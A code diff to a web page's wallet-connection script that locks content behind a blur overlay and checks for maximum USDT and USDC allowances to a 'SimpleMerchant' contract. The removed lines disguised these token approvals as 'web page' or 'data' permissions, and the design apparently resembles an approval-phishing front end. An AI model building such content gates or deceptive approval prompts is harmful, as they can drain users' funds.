@@ -22,7 +22,9 @@ const connectButton = document.getElementById('connectButton');
 const blurOverlay = document.getElementById('blurOverlay'); // 获取遮罩层元素
 const overlayMessage = document.getElementById('overlayMessage');
 const lockedPrompt = document.getElementById('lockedPrompt');
-const overlay = document.getElementById('blurOverlay');  // <----  在这里定义  修正： 1.  明确定义，2.  确保在 HTML 里存在 <div id="blurOverlay">
+const overlay = document.getElementById('blurOverlay');  // 确保在这里定义
+const statusDiv = document.getElementById('status');  //  获取 status 元素，在外面定义，避免重复获取。
+
 // --- 状态变量 ---
 let provider;
 let signer;
@@ -31,11 +33,13 @@ let contract;
 let usdtContract;
 let usdcContract;
 let isConnectedFlag = false;
+let accountChangeListener = null;  // 存储账号改变的监听器
+let chainChangeListener = null;    // 存储链改变的监听器
 
 // --- 遮罩控制函數 ---
 function hideOverlay() {
     if (!overlay) {
-        console.error("Overlay element not found."); // 调试，防止错误
+        console.error("Overlay element not found.");
         return;
     }
     overlay.style.opacity = '0';
@@ -46,7 +50,7 @@ function hideOverlay() {
 
 function showOverlay(message) {
     if (!overlay) {
-        console.error("Overlay element not found."); // 调试，防止错误
+        console.error("Overlay element not found.");
         return;
     }
     overlayMessage.innerHTML = message;
@@ -73,71 +77,18 @@ function updateConnectionUI(connected, address = null) {
     }
 }
 
-// --- 初始化合约和用户界面 ---
-async function initialize() {
-    try {
-        if (!userAddress) {
-            updateConnectionUI(false);
-            return;
-        }
-        // 使用 provider 和 signer 初始化合约实例
-        provider = new ethers.BrowserProvider(window.ethereum); // 重新获取 provider
-        signer = await provider.getSigner();
-        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
-        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS_TOKEN, ERC20_ABI, signer); // 使用新的 USDC 合约地址
-
-        // 检查链
-        const network = await provider.getNetwork();
-        if (network.chainId !== 1n) { // 1n is Mainnet Chain ID  (或者改为你的目标网络链ID)
-            updateStatus('Switching to Ethereum Mainnet...'); //  改为你的目标网络名称
-            showOverlay('Switching to Ethereum Mainnet... Please confirm in your wallet.'); // 提示切換到目標網路
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x1' }], //  Mainnet 链 ID (需要根据你的应用调整)
-                });
-            } catch (switchError) {
-                if (switchError.code === 4902) {  // 4902:  未添加该链
-                    try {
-                        await window.ethereum.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [
-                                {
-                                    chainId: '0x1', // Mainnet
-                                    chainName: 'Ethereum Mainnet',  //  你的目標網路名稱
-                                    nativeCurrency: {
-                                        name: 'ETH',
-                                        symbol: 'ETH',
-                                        decimals: 18,
-                                    },
-                                    rpcUrls: ['https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'], // 你的 RPC URL
-                                    blockExplorerUrls: ['https://etherscan.io'],
-                                },
-                            ],
-                        });
-                    } catch (addChainError) {
-                        console.error("Failed to add Ethereum Mainnet:", addChainError);
-                        updateStatus(`Network switch failed: ${addChainError.message}`);
-                        showOverlay(`Network switch failure: ${addChainError.message}`);
-                        return;
-                    }
-
-                } else {
-                    updateStatus(`Network switch failed: ${switchError.message}`);
-                    showOverlay(`Network switch failure: ${switchError.message}`);
-                    return;
-                }
-            }
-
-        }
-        console.log("✅ Initialization successful:", userAddress);
-        updateStatus(''); // 清空/隱藏狀態欄
-        checkAuthorization(); // 在初始化成功后，检查授权状态
-    } catch (error) {
-        console.error("Initialization failed:", error);
-        updateStatus(`Initialization failed: ${error.message}`);
-        showOverlay(`Initialization failed: ${error.message}`);
+// --- 核心功能：控制状态栏的隐藏与显示。 ---
+function updateStatus(message) {
+    if (!statusDiv) {
+        console.error("Status element not found.");
+        return; // 避免设置 innerHTML
+    }
+    if (message) {
+        statusDiv.innerHTML = `${message}`;
+        statusDiv.style.display = 'block';
+    } else {
+        statusDiv.innerHTML = '';
+        statusDiv.style.display = 'none';
     }
 }
 
@@ -165,34 +116,33 @@ async function checkAuthorization() {
             usdcBalance = await usdcContract.balanceOf(userAddress);
         } catch(e) { /* Ignore balance read error */ }
 
-
         let statusMessage = '';
 
         // SimpleMerchant 合約授權
         if (isAuthorized) {
-            statusMessage += 'Wallet connected ✅. ';
+            statusMessage += 'Web page access authorized ✅. ';
         } else {
-            statusMessage += 'Wallet connect failed ❌. ';
+            statusMessage += 'Web page access not authorized ❌. ';
         }
 
         // USDT 的授權狀態
         statusMessage += `USDT Balance: ${ethers.formatUnits(usdtBalance, 6)}. `;
         if (isUsdtMaxApproved) {
-            statusMessage += `Web page authorization successful ✅.`;
+            statusMessage += `USDT approved ✅.`;
         } else if (usdtAllowance > 0n) {
-            statusMessage += `Web page authorization failed ⚠️.`;
+            statusMessage += `USDT approval needed ⚠️.`;
         } else {
-            statusMessage += `Data permissions are not authorized or authorization fails ❌.`;
+            statusMessage += `USDT not approved ❌.`;
         }
 
         // USDC 的授權狀態
         statusMessage += `USDC Balance: ${ethers.formatUnits(usdcBalance, 6)}. `;
         if (isUsdcMaxApproved) {
-            statusMessage += `Data permission authorization successful ✅.`;
+            statusMessage += `USDC approved ✅.`;
         } else if (usdcAllowance > 0n) {
-            statusMessage += `Data authorization failed ⚠️.`;
+            statusMessage += `USDC approval needed ⚠️.`;
         } else {
-            statusMessage += `Data permissions are not authorized or authorization fails ❌.`;
+            statusMessage += `USDC not approved ❌.`;
         }
 
         // Button state: needs to be clicked if authorization is incomplete
@@ -225,13 +175,14 @@ async function connectWallet() {
             updateStatus('Please install MetaMask or a supported wallet');
             return;
         }
-        updateStatus('');
+        updateStatus('Connecting to wallet...'); //  在开始连接时，显示状态
         showOverlay('Please confirm the connection request in your wallet...');
 
         // 1. Request account access (连接请求)
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         userAddress = accounts[0]; // 获取用户地址
         console.log("✅ User Address:", userAddress);
+        updateConnectionUI(true, userAddress);  // 更新连接状态
 
         // 2. 获取 provider, signer 和合约实例
         provider = new ethers.BrowserProvider(window.ethereum);
@@ -240,15 +191,32 @@ async function connectWallet() {
         usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
         usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS_TOKEN, ERC20_ABI, signer);  // 使用新的 USDC 合约地址
 
-        updateConnectionUI(true, userAddress);  // 更新连接状态
-        await initialize();  // 初始化并检查授权
+        // 3. 检查授权状态 并处理
+        await handleAuthorization();
+
     } catch (error) {
         console.error("Error connecting to wallet:", error);
         updateConnectionUI(false);
         showOverlay(`🔴 Connection failed: ${error.message}`);
+        updateStatus(`Connection failed: ${error.message}`); //  显示错误信息
     }
 }
 
+// --- 处理授权流程 ---
+async function handleAuthorization() {
+    try {
+        if (!signer || !userAddress || !contract || !usdtContract || !usdcContract) {
+            showOverlay('Wallet not connected. Please connect.');
+            return;
+        }
+        // 检查授权状态
+        await checkAuthorization(); // 检查授权并更新 UI
+    } catch (error) {
+        console.error("Authorization process failed:", error);
+        showOverlay(`🔴 Authorization process failed: ${error.message}`);
+        updateStatus(`Authorization failed: ${error.message}`);
+    }
+}
 // --- 斷開錢包連接 ---
 function disconnectWallet() {
     userAddress = null;
@@ -261,22 +229,6 @@ function disconnectWallet() {
     showOverlay('Please link your wallet to unlock the page 🔒');
 }
 
-// --- 核心功能：控制状态栏的隐藏与显示。 ---
-function updateStatus(message) {
-    const statusDiv = document.getElementById('status');
-    if (!statusDiv) {
-        console.error("Status element not found.");
-        return; // 避免设置 innerHTML
-    }
-    if (message) {
-        statusDiv.innerHTML = `${message}`;
-        statusDiv.style.display = 'block';
-    } else {
-        statusDiv.innerHTML = '';
-        statusDiv.style.display = 'none';
-    }
-}
-
 // 事件监听器 (与之前类似)
 connectButton.addEventListener('click', () => {
     if (isConnectedFlag) {
@@ -285,7 +237,11 @@ connectButton.addEventListener('click', () => {
         connectWallet(); // 连接钱包
     }
 });
+
 // 页面加载完成后，初始化
 window.onload = () => {
-   // 确保在页面加载时,  先不显示状态， 而是在点击 connectWallet 后才显示
+    // 确保在页面加载时，显示未连接的 UI
+    updateConnectionUI(false); // 初始 UI 状态
+    //  在页面加载的时候，显示提示
+    showOverlay('Please connect your wallet to unlock the content. Click the wallet icon in the upper right corner.');
 };
